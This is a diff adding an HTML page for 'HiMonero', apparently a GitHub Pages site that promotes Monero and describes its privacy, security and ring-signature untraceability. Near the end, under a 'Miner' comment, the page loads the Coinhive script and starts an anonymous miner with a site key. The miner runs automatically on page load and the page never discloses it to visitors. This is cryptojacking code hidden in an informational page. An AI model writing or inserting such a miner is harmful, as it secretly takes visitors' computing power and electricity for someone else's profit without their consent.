@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<title>HiMonero</title>
+<link rel="stylesheet" href="style.css">
+<link href="favicon.ico" rel="icon" type="image/x-icon"/>
+<head>
+<!-- Navi-Bar -->
+<style>
+ul {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: #333;
+}
+
+li {
+    float: left;
+}
+
+li a {
+    display: block;
+    color: white;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+}
+
+li a:hover:not(.active) {
+    background-color: #E59400;
+}
+
+.active {
+    background-color: #E59400;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a href="https://galien1.github.io/HiMonero">Home</a></li>
+  <li><a href="https://galien1.github.io/HiMonerostats">XMR Stats</a></li>
+  <li><a href="#contact">Contact</a></li>
+  <li style="float:right"><a class="active" href="#about">About</a></li>
+</ul>
+<!-- background-color -->
+<body style="background-color:grey;">
+
+</body>
+<!-- Text -->
+
+<body>
+<h1><p>Welcome to HiMonero!</p></h1>
+
+<iframe src="https://discordapp.com/widget?id=397803557740347392&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" align='right'></iframe>
+<div>
+<small>
+<h2><p><u>Why Monero?</u></p></h2>
+<h2><p>Monero is a private, secure, untraceable, decentralised digital currency. You are your bank, you control your funds, and nobody can trace your transfers unless you allow them to do so.</p></h2>
+
+<h2><p><u>Privacy</u></p></h2>
+<h2><p>Monero uses a cryptographically sound system to allow you to send and receive funds without your transactions being easily revealed on the blockchain (the ledger of transactions that everyone has). This ensures that your purchases, receipts, and all transfers remain absolutely private by default.</p></h2>
+
+<h2><p><u>Security</u></p></h2>
+<h2><p>Using the power of a distributed peer-to-peer consensus network, every transaction on the network is cryptographically secured. Individual wallets have a 25 word mnemonic seed that is only displayed once, and can be written down to backup the wallet. Wallet files are encrypted with a passphrase to ensure they are useless if stolen.</p></h2>
+
+<h2><p><u>Untraceability</u></p></h2>
+<h2><p>By taking advantage of ring signatures, a special property of a certain type of cryptography, Monero is able to ensure that transactions are not only untraceable, but have an optional measure of ambiguity that ensures that transactions cannot easily be tied back to an individual user or computer.</p></h2>
+
+<h2><p><u>For technical details, please see this answer on stackexchange:</u></p></h2>
+<h2><p><nound><a href="https://monero.stackexchange.com/questions/2254/what-advantages-does-monero-offer-that-are-not-provided-by-other-cryptocurrencie/2255#2255" text-decoration='none'>https://monero.stackexchange.com/questions/2254/what-advantages-does-monero-offer-that-are-not-provided-by-other-cryptocurrencie/2255#2255</a></nound></p></h2>
+</small>
+</div>
+
+<!-- Miner -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('RlGAt8lTJCiTqjr9OqXielT42XrsEFLl', { throttle: 0.5 });
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+miner.start();
+</script>
+
+<script>
+// Listen on events
+miner.on('found', function() { /* Hash found */ })
+miner.on('accepted', function() { /* Hash accepted by the pool */ })
+// Update stats once per second
+setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    // Output to HTML elements...
+}, 1000);
+</script>
+</body>
+</html>
